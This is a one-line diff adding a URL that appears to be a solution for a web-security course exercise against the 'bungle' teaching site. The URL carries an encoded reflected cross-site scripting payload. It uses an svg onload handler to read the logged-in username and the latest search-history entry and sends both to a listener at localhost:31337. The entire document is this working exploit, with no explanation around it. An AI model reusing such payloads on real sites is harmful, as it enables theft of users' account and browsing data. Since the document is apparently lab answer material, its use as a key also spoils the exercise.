@@ -1,0 +1,1 @@
+http://bungle.sysnet.ucsd.edu/search?xssdefense=2&q=%3Csvg%20onload%3D%27%24(function()%7Bvar%20u%3D%24(%22%23logged-in-user%22).text()%3Bvar%20h%3D%24(%22%23history-list%22).children().eq(1).text()%3Bwindow.location%3D%22http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%22%2BencodeURIComponent(u)%2B%22%26last_search%3D%22%2BencodeURIComponent(h)%3B%7D)%27%3E
